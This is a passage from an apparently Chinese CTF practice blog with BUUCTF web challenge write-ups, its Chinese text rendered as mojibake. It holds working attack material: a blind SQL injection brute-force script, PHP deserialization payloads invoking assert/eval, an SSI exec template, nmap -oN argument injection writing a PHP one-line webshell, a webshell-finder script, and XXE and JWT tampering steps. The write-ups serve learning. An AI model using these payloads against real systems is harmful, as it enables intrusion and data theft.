   public function update_profile($username, $new_profile) &#123;
      $username &#x3D; parent::filter($username);
      $new_profile &#x3D; parent::filter($new_profile);

      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
      return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);
   &#125;
   public function __tostring() &#123;
      return __class__;
   &#125;
&#125;

class mysql &#123;
   private $link &#x3D; null;

   public function connect($config) &#123;
      $this-&gt;link &#x3D; mysql_connect(
         $config[&#39;hostname&#39;],
         $config[&#39;username&#39;], 
         $config[&#39;password&#39;]
      );
      mysql_select_db($config[&#39;database&#39;]);
      mysql_query(&quot;SET sql_mode&#x3D;&#39;strict_all_tables&#39;&quot;);

      return $this-&gt;link;
   &#125;

   public function select($table, $where, $ret &#x3D; &#39;*&#39;) &#123;
      $sql &#x3D; &quot;SELECT $ret FROM $table WHERE $where&quot;;
      $result &#x3D; mysql_query($sql, $this-&gt;link);
      return mysql_fetch_object($result);
   &#125;

   public function insert($table, $key_list, $value_list) &#123;
      $key &#x3D; implode(&#39;,&#39;, $key_list);
      $value &#x3D; &#39;\&#39;&#39; . implode(&#39;\&#39;,\&#39;&#39;, $value_list) . &#39;\&#39;&#39;; 
      $sql &#x3D; &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;
      return mysql_query($sql);
   &#125;

   public function update($table, $key, $value, $where) &#123;
      $sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;;
      return mysql_query($sql);
   &#125;

   public function filter($string) &#123;
      $escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
      $escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;
      $string &#x3D; preg_replace($escape, &#39;_&#39;, $string);

      $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
      $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;
      return preg_replace($safe, &#39;hacker&#39;, $string);
   &#125;
   public function __tostring() &#123;
      return __class__;
   &#125;
&#125;
session_start();
$user &#x3D; new user();
$user-&gt;connect($config);</code></pre>

<p>update.php</p>
<pre class="language-none"><code class="language-none">&lt;?php
   require_once(&#39;class.php&#39;);
   if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;
      die(&#39;Login First&#39;);    
   &#125;
   if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;

      $username &#x3D; $_SESSION[&#39;username&#39;];
      if(!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))
         die(&#39;Invalid phone&#39;);

      if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))
         die(&#39;Invalid email&#39;);
      
      if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)
         die(&#39;Invalid nickname&#39;);

      $file &#x3D; $_FILES[&#39;photo&#39;];
      if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)
         die(&#39;Photo size error&#39;);

      move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));
      $profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];
      $profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];
      $profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;];
      $profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);

      $user-&gt;update_profile($username, serialize($profile));
      echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;
   &#125;
   else &#123;
?&gt;</code></pre>

<p>config.php</p>
<pre class="language-none"><code class="language-none">&lt;?php
   $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;
   $config[&#39;username&#39;] &#x3D; &#39;root&#39;;
   $config[&#39;password&#39;] &#x3D; &#39;&#39;;
   $config[&#39;database&#39;] &#x3D; &#39;&#39;;
   $flag &#x3D; &#39;&#39;;
?&gt;</code></pre>

<p>profileé‡Œæœ‰ä¸ªfile_get_contentå‡½æ•°å¯èƒ½æœ‰æ–‡ä»¶è¯»å–æ¼æ´ï¼Œè€Œflagåœ¨config.phpä¸­ï¼Œå°±è¦è®©photo=config.phpï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨å‰è¾¹çš„$profile = unserialize($profile);</p>
<p>æ‰€ä»¥å†æ ¹æ®</p>
<pre class="language-none"><code class="language-none">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
     $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;
     return preg_replace($safe, &#39;hacker&#39;, $string);
  &#125;</code></pre>

<p>å¯ä»¥è¿›è¡Œååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903162948758.png" alt="image-20210903162948758"></p>
<pre class="language-none"><code class="language-none">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre>

<p>è¿™é‡Œè¿™ä¸ªè¿‡æ»¤å¯ä»¥åˆ©ç”¨æŠ“åŒ…å°†nickenameæ”¹æˆæ•°ç»„ç±»å‹æ¥ç»•è¿‡</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163055572.png" alt="image-20210903163055572"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163139438.png" alt="image-20210903163139438"></p>
<p>çœ‹ä¸€ä¸‹è¿™ä¸ªyour profileé¡µé¢</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163211494.png" alt="image-20210903163211494"></p>
<p>çœ‹ä¸€ä¸‹è¿™ä¸ªå›¾ç‰‡çš„æºç ï¼Œæ˜¯ä¸ªbase64åŠ å¯†çš„å†…å®¹ï¼Œè¿›è¡Œè§£å¯†åå¯ä»¥å¾—åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163313640.png" alt="image-20210903163313640"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163322131.png" alt="image-20210903163322131"></p>
<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>è¿›å»åçœ‹æºç ï¼Œæœ‰ä¸€æ®µjsè„šæœ¬</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906112938529.png" alt="image-20210906112938529"></p>
<p>è¯•äº†ä¸€ä¸‹è¿™ä¸ªmd5ï¼Œèƒ½è§£å‡ºæ¥ä½†æ˜¯æ˜¯ä»˜è´¹è®°å½•</p>
<p>æ‰€ä»¥ç›´æ¥çœ‹flag.php</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906113351506.png" alt="image-20210906113351506"></p>
<p>â€œé™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±â€</p>
<p>é‚£å°±è¯•è¯•127.0.0.1æœ¬åœ°è®¿é—®</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906113445324.png" alt="image-20210906113445324"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h2><p>ç›²æ³¨ï¼Œæ³¨å…¥ç‚¹åœ¨id</p>
<p>å¯ä»¥åˆ©ç”¨å¼‚æˆ–æ¥è¿›è¡Œç›²æ³¨</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906123555686.png" alt="image-20210906123555686"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906123751187.png" alt="image-20210906123751187"></p>
<p>æ‰¾ä¸ªè„šæœ¬ç›´æ¥çˆ†ç ´ï¼Œå­¦ä¸€ä¸‹è¿™ä¸ªè„šæœ¬</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
import sys
import time

def get_DBlen(url):
    for i in range(1,10):
        db_url &#x3D; url+&quot;1^1^(length(database())&#x3D;%d)#&quot;%i
        r &#x3D; requests.get(db_url)
        if &quot;Click&quot; in r.text:
            print(&quot;æ•°æ®åº“åç§°çš„é•¿åº¦ä¸º:%d&quot;%i)
            return i

def get_DBname(url,length):
    DBname &#x3D; &quot;&quot;
    length &#x3D; length + 1
    for i in range(1,length):
        Max &#x3D; 122
        Min &#x3D; 41
        Mid &#x3D; (Max+Min)&#x2F;&#x2F;2
        while Min &lt;&#x3D; Max:
            # çˆ†è¡¨å
            db_url &#x3D; url+&quot;1^1^(ascii(substr(database(),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)
            r &#x3D; requests.get(db_url)
            if &quot;Click&quot; in r.text:
                Min&#x3D;Mid+1
                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2
                pass
            else:
                Max &#x3D; Mid-1
                Mid &#x3D; (Min+Max)&#x2F;&#x2F;2
                pass
            pass
        DBname &#x3D; DBname + chr(Mid)
    print(DBname)
    return DBname

def get_TBname(url):
    name&#x3D;&quot;&quot;
    i &#x3D; 0
    while True:
        i &#x3D; i+1
        Max &#x3D; 128
        Min &#x3D; 32
        Mid &#x3D; (Max+Min)&#x2F;&#x2F;2
        while Min &lt;&#x3D; Max:
            # çˆ†è¡¨å
            # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)
            # çˆ†å­—æ®µå
            # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)
            # è·å–flag
            db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;&#x3D;%d)&quot;%(i,Mid)
            r &#x3D; requests.get(db_url)
            if &quot;Click&quot; in r.text:
                Min&#x3D;Mid+1
                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2
                pass
            else:
                Max&#x3D;Mid-1
                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2
                pass
            pass
        name&#x3D;name+chr(Mid)
        print(name)
        if Mid &#x3D;&#x3D; 31:
            break
        time.sleep(0.5)
  if __name__&#x3D;&#x3D;&quot;__main__&quot;:
    url &#x3D; &quot;http:&#x2F;&#x2F;0b2df33c-3f5b-4b49-ae98-ca2c2c2e55bf.node4.buuoj.cn:81&#x2F;search.php?id&#x3D;&quot;
    db_Len &#x3D; get_DBlen(url)
    db_Name &#x3D; get_DBname(url,db_Len)
    tb_name &#x3D; get_TBname(url)

</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906151816679.png" alt="image-20210906151816679"></p>
<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907150757059.png" alt="image-20210907150757059"></p>
<p>è·³åˆ°time.php?sourceç•Œé¢çœ‹çœ‹å†…å®¹</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907150827681.png" alt="image-20210907150827681"></p>
<p>ååºåˆ—åŒ–æ„é€ å®ç°å‘½ä»¤æ‰§è¡Œ</p>
<p>systemè¿™é‡Œåº”è¯¥æ˜¯è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨assertä»£æ›¿</p>
<pre class="language-none"><code class="language-none">assert()ç®€ä»‹ï¼šåˆ¤æ–­ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯å¦æˆç«‹ã€‚è¿”å›true or falseã€‚

å½“å‚æ•°ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œä¼šè¢«å½“ä½œphpä»£ç æ‰§è¡Œã€‚
ä¾‹å¦‚ assert(&quot;phpinfo()&quot;)  &lt;&#x3D;&#x3D;&gt;  &lt;?phpinfo()?&gt;

assertä¸evalçš„åŒºåˆ«

assertæŠŠæ•´ä¸ªå­—ç¬¦ä¸²å‚æ•°å½“phpä»£ç æ‰§è¡Œï¼ŒevalæŠŠåˆæ³•çš„phpä»£ç æ‰§è¡Œã€‚</code></pre>

<p>payloadï¼š?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}</p>
<p>æˆ–è€…?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:16:&quot;eval($_POST[a]);&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}ç„¶åpostï¼ša=phpinfo</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907151408539.png" alt="image-20210907151408539"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907153837010.png" alt="image-20210907153837010"></p>
<p>æœç´¢flagå°±èƒ½æ‰¾åˆ°</p>
<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>xffå¤´çš„sstiæ³¨å…¥ï¼Œæˆ‘å¥½åƒä¹‹å‰åšè¿‡ä¸€ä¸ªå·®ä¸å¤šçš„</p>
<p>ç•Œé¢å³ä¸Šè§’ipå¯éšæ„æ”¹å˜ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨readfileå‡½æ•°è¯»flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907155218173.png" alt="image-20210907155218173"></p>
<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>æ‰«ç›®å½•ï¼Œå‘ç°index.php.swpç•Œé¢</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907202133630.png" alt="image-20210907202133630"></p>
<p>è¦è®©passwordå‰å…­ä½md5å€¼ä¸º6d0bc1</p>
<p>çˆ†ç ´ä¸€ä¸‹</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907203923885.png" alt="image-20210907203923885"></p>
<p>ç™»å½•åæŠ“åŒ…</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204116239.png" alt="image-20210907204116239"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹è§ä¸€ä¸ªshtmlé¡µé¢</p>
<p>è¿›å…¥åçš„é¡µé¢</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204437473.png" alt="image-20210907204437473"></p>
<p>è¿™é‡Œadminçš„ä½ç½®æ˜¯æˆ‘ä»¬çš„ç”¨æˆ·åï¼Œè¿™é‡Œåˆ©ç”¨äº†sslæ³¨å…¥</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40657585/article/details/84260844"> SSIæ³¨å…¥æ¼æ´_Hydraçš„åšå®¢-CSDNåšå®¢_ssiæ³¨å…¥</a></p>
<p>æ¨¡æ¿å°±ç±»ä¼¼äº</p>
<!--#exec cmd="æ–‡ä»¶åç§°"-->

<p>å¯ä»¥å…ˆç”¨lsæŸ¥çœ‹ç›®å½•æ‰¾åˆ°flagæ–‡ä»¶ï¼Œå†åˆ©ç”¨catæŸ¥çœ‹</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204923959.png" alt="image-20210907204923959"></p>
<p>è®¿é—®é¡µé¢æ‰¾åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204713176.png" alt="image-20210907204713176"></p>
<h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>f12æºç é‡Œæœ‰flag</p>
<p>å¥½ä¹…æ²¡åšè¿™ä¹ˆç®€å•çš„äº†</p>
<h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p>å¸¸è§çš„nmapå‘½ä»¤</p>
<p><a target="_blank" rel="noopener" href="http://linux.51yip.com/search/nmap">nmap linux å‘½ä»¤ åœ¨çº¿ä¸­æ–‡æ‰‹å†Œ (51yip.com)</a></p>
<p>é€‰é¡¹ è§£é‡Š<br>-oN æ ‡å‡†ä¿å­˜<br>-oX XMLä¿å­˜<br>-oG Grepä¿å­˜<br>-oA ä¿å­˜åˆ°æ‰€æœ‰æ ¼å¼<br>-append-output è¡¥å……ä¿å­˜æ–‡ä»¶<br>é€‰é¡¹-oG<br>å°†ç»“æœGrepä¿å­˜ã€‚</p>
<p>nmap -F -oG test.txt 192.168.23.1<br>1<br>é€‰é¡¹-oA<br>è¯¥é€‰é¡¹å¯å°†æ‰«æç»“æœä»¥æ ‡å‡†æ ¼å¼ã€XMLæ ¼å¼å’ŒGrepæ ¼å¼ä¸€æ¬¡æ€§ä¿å­˜ï¼Œåˆ†åˆ«æ”¾åœ¨.nmapï¼Œ.xmlå’Œ.gnmapæ–‡ä»¶ä¸­ã€‚</p>
<p>nmap -F -oA test 192.168.3.2</p>
<p>è¿™é‡Œå°±æ˜¯è¦ç”¨nmapçš„ -oNå‘½ä»¤å†™shell</p>
<pre class="language-none"><code class="language-none">&#39; -oN w4ke.txt &#39;</code></pre>

<p>è¿”å›host maybe downä¹‹åè®¿é—®w4ke.txt</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907215022693.png" alt="image-20210907215022693"></p>
<p>æ‰€ä»¥å¯ä»¥è¯•è¯•å†™ä¸ªä¸€å¥è¯æœ¨é©¬ä¸Šå»</p>
<pre class="language-none"><code class="language-none">&#39; -oN b.txt  &lt;?php eval($_POST[&#39;a&#39;]); ?&gt;&#39;</code></pre>

<p>è¿”å›äº†hackerï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æœ‰ä¸œè¥¿è¢«è¿‡æ»¤äº†</p>
<p>è¯•äº†ä¸€ä¸‹å‘ç°æ˜¯phpè¢«è¿‡æ»¤äº†</p>
<p>å¯ä»¥ç”¨å…¶ä»–çš„è¿›è¡Œæ›¿ä»£</p>
<pre class="language-none"><code class="language-none">&lt;?&#x3D;eval($_POST[a]);?&gt;</code></pre>

<p>åˆ©ç”¨postä¼ å‚æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907221126211.png" alt="image-20210907221126211"></p>
<p>å‚è€ƒé“¾æ¥ </p>
<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43801002/article/details/107746582">ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap_æµ©æ­Œå·²è¡Œçš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://www.icode9.com/content-4-756152.html">ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap (icode9.com)</a></p>
<h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><p>æ ¹æ®é¢˜ç›®æç¤ºä¸‹è½½å‹ç¼©åŒ…æ–‡ä»¶ï¼Œé‡Œé¢å­˜åœ¨ä¸‰åƒå¤šä¸ªphpæ–‡ä»¶</p>
<p>æ¯ä¸€ä¸ªæ–‡ä»¶é‡Œéƒ½æœ‰shellï¼Œæˆ‘ä»¬è¦æ‰¾åˆ°ä¸€ä¸ªèƒ½ç”¨çš„</p>
<pre class="language-none"><code class="language-none">import requests
import os
import re

url &#x3D; &#39;http:&#x2F;&#x2F;22ffcd5e-b2cc-48c3-b7b7-4ba7bcc7d244.node4.buuoj.cn:81&#x2F;&#39;
path &#x3D; r&#39;C:\Users\ethe\Desktop\www\src&#39;

ptn_get &#x3D; re.compile(br&quot;\$_GET\[&#39;(\w+)&#39;\]&quot;)
ptn_res &#x3D; re.compile(br&#39;success_hack&#39;)

count &#x3D; 0

for f in list(os.scandir(path)):
    print(str(f)[11:-2])
    count +&#x3D; 1

    with open(f.path, &#39;rb&#39;) as fp:
        data &#x3D; fp.read()
    for get in set(ptn_get.findall(data)):
        get &#x3D; get.decode(&#39;utf-8&#39;)
        cmd &#x3D; &#39;echo &quot;success_hack&quot;;&#39;

        r &#x3D; requests.get(url + f.name, params&#x3D;&#123;get: cmd&#125;)
        if ptn_res.search(r.content) is not None:
            print(f.name, get)
            exit()
</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908221800930.png" alt="image-20210908221800930"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908221812146.png" alt="image-20210908221812146"></p>
<h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>é¢˜ç›®æç¤ºxmlï¼ŒæŠ“åŒ…å</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909203429736.png" alt="image-20210909203429736"></p>
<p>çŒœåº”è¯¥æ˜¯æœ‰xxeæ³¨å…¥ï¼Œç›´æ¥ä¸Špayloadï¼Œå‘ç°æ²¡è¯»å–æˆåŠŸ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909203626014.png" alt="image-20210909203626014"></p>
<p>çœ‹ä¸€çœ‹dologin.phpçš„æºç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909204007128.png" alt="image-20210909204007128"></p>
<pre class="language-none"><code class="language-none">&lt;?php
&#x2F;**
* autor: c0ny1
* date: 2018-2-7
*&#x2F;

$USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;Ã¨Â´Â¦Ã¥ÂÂ·
$PASSWORD &#x3D; &#39;024b87931a03f738fff6693ce0a78c88&#39;; &#x2F;&#x2F;Ã¥Â¯Â†Ã§Â Â
$result &#x3D; null;

libxml_disable_entity_loader(false);
$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);

try&#123;
	$dom &#x3D; new DOMDocument();
	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds &#x3D; simplexml_import_dom($dom);

	$username &#x3D; $creds-&gt;username;
	$password &#x3D; $creds-&gt;password;

	if($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD)&#123;
		$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,1,$username);
	&#125;else&#123;
		$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,0,$username);
	&#125;	
&#125;catch(Exception $e)&#123;
	$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,3,$e-&gt;getMessage());
&#125;

header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;);
echo $result;
?&gt;</code></pre>

<p>ä½†æ˜¯ä»è¿™ä¸ªæºç é‡Œä¹Ÿæ‰¾ä¸åˆ°flag</p>
<p>åè¾¹å°±æ˜¯æˆ‘çœ‹ä¸æ‡‚çš„æ“ä½œäº†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909210613519.png" alt="image-20210909210613519"></p>
<p>è®¿é—®proc/net/arpæ–‡ä»¶æŸ¥çœ‹æœ‰æ— å¯åˆ©ç”¨å†…ç½‘ä¸»æœº</p>
<p>å°è¯•è®¿é—®ä¸€ä¸‹è¿™ä¸ªipï¼ŒæŠ¥é”™</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909211003923.png" alt="image-20210909211003923"></p>
<p>ä¹‹åcæ®µæ‰«æï¼Œæ‰¾åˆ°flag</p>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p>è¿™é¢˜æ„Ÿè§‰æœ‰ç‚¹é—®é¢˜</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153230545.png" alt="image-20210912153230545"></p>
<p>å†™è„šæœ¬æ‰¾lv6</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153247599.png" alt="image-20210912153247599"></p>
<p>æ‰¾åˆ°å</p>
<p>å¾ˆæ˜æ˜¾é’±ä¸å¤Ÿ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153310649.png" alt="image-20210912153310649"></p>
<p>è¿™é‡Œå¯ä»¥æŠ“åŒ…æ”¹æŠ˜æ‰£ï¼Œå½“æŠ˜æ‰£è¶³å¤Ÿå°çš„æ—¶å€™å°±å‡ºç°ä¸€ä¸ªé‡å®šå‘</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153400419.png" alt="image-20210912153400419"></p>
<p>æ¥ä¸‹æ¥çš„æ­¥éª¤æ„Ÿè§‰å°±æœ‰ç‚¹é—®é¢˜äº†ï¼Œå½“ç›´æ¥åœ¨burpæ”¹è·¯å¾„çš„æ—¶å€™ä¼šç›´æ¥è·³è¿‡ä¸€ä¸ªcookieçš„ä¿®æ”¹å˜æˆadmin</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153441750.png" alt="image-20210912153441750"></p>
<p>ä½†æ˜¯ç›´æ¥åœ¨urlæ ä¿®æ”¹ä¼šè¦æ±‚ç”¨æˆ·æ˜¯admin</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153559514.png" alt="image-20210912153559514"></p>
<p>è¿™å°±è¦æ±‚ä¿®æ”¹jwtçš„cookie</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">è®¤è¯†JWT - åºŸç‰©å¤§å¸ˆå…„ - åšå®¢å›­ (cnblogs.com)</a></p>
